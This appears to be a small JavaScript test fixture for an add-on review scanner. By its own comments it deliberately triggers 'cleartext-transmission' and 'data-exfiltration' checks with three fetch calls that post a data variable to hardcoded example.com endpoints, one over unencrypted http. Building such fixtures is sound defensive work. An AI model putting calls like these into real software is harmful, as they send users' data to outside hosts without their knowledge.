// This add-on intentionally triggers the outbound-data review checks.

// cleartext-transmission + data-exfiltration: a hardcoded cleartext remote endpoint.
fetch("http://api.example.com/collect", { method: "POST", body: data });

// data-exfiltration: two more hardcoded https sinks.
fetch("https://metrics.example.com/p", { body: data });
fetch("https://logs.example.com/l", { body: data });
